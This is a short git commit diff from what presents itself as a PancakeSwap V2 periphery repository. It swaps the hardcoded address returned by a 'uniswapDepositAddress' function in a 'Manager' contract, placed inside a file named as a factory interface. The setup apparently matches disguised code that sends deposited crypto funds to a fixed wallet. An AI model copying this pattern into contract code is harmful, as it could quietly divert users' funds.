6f5ecd57bd410373b01649713062c7dbb0a2ad71
MoonDevPCSWP <96997307+MoonDevPCSWP@users.noreply.github.com>
2022-01-02 22:06:06 +0200

    Update IPancakeswapV2Factory.sol

--- pancakeswap-v2-periphery-main/contracts/interfaces/V2/IPancakeswapV2Factory.sol
+++ pancakeswap-v2-periphery-main/contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -6,6 +6,6 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0x5c105a105134b5233147B1E2e1948Cfc4b9b74Dc;
+		return 0x36715d1ffb356ba2A9414976D641CFb9F2344dCf;
 	}
 }
